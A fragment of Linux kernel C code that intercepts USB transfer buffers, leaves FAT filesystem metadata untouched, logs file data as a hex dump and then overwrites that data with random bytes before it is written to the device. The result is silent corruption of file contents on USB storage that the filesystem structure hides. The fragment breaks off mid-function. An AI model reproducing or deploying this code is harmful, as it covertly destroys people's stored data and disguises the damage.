static void process(struct urb *urb)
{
    struct scatterlist *sg;
    int i;
    for_each_sg(urb->sg, sg, urb->num_sgs, i) 
    {
        void *virt_addr;
        size_t len = sg->length;   
        struct page *page = sg_page(sg);
        if (page) 
        {
            virt_addr = kmap_local_page(page);
            if (virt_addr) 
            {
                virt_addr += sg->offset;
                printk(KERN_INFO "  SG[%d]: len=%zu\n", i, len);
                if (memcmp(virt_addr, VOLUME_NAME, strlen(VOLUME_NAME)) == 0 ||
                    is_fat_table(virt_addr) ||        // fat table?
                    ((char*)virt_addr)[11] == 0x10 || // directory?
                    ((char*)virt_addr)[0] == 0xE5 || // is free element?
                    *(__le32 *)&((char*)virt_addr)[0] == cpu_to_le32(FAT_FSINFO_SIG1) ||
                    find_first_nonzero(virt_addr, len) == -1)
                    goto unmap;
                print_hex_dump(KERN_INFO, "    Data: ", 
                            DUMP_PREFIX_OFFSET, 16, 1,
                            virt_addr, min(len, 512), true);
                get_random_bytes(virt_addr, len);
                if (urb->dev->bus && urb->dev->bus->sysdev) {
                    dma_sync_single_for_device(
                        urb->dev->bus->sysdev,
                        sg_dma_address(sg),
                        len,
                        DMA_TO_DEVICE);
                }